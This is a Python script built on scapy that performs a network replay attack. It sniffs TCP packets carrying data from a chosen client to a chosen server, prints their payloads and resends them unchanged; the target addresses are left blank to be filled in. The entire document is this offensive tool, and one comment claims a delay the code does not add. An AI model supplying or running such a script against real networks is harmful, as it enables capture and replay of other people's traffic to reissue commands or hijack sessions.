from scapy.all import sniff, send, IP, TCP, Raw, get_if_list

client_ip = ''  # Replace with the client's IP
server_ip = ''  # Replace with the server's IP

def filter_data_packets(packet, seen_payloads):
    # Ensure it's a TCP packet between client and server with data payload
    if packet.haslayer(TCP) and packet.haslayer(Raw) and \
       ((packet[IP].src == client_ip and packet[IP].dst == server_ip) ):
        
        payload = packet[Raw].load
        # Only capture packets with unique payloads
        if payload not in seen_payloads:
            seen_payloads.add(payload)
            return True
    return False

def replay_attack():
    seen_payloads = set()  # Track unique payloads to avoid duplicates

    # Debugging: Print the network interfaces
    print("Available network interfaces:", get_if_list())

    # Capture packets with unique data payload (excluding SYN, ACK-only packets)
    print("Capturing packets...")
    packets = sniff(filter="tcp", lfilter=lambda x: filter_data_packets(x, seen_payloads),
                    count=5, iface="eth0")  # Replace with the correct interface

    if not packets:
        print("No unique packets with data payload captured.")
        return

    print("Captured unique packets with data for replay:")
    for packet in packets:
        if packet.haslayer(Raw):
            print("Payload:", packet[Raw].load)  # Print payload data only

    # Replay packets with a slight delay to simulate a more natural flow
    for packet in packets:
        send(packet)
        print("Sent packet with payload:", packet[Raw].load)

if __name__ == '__main__':
    replay_attack()
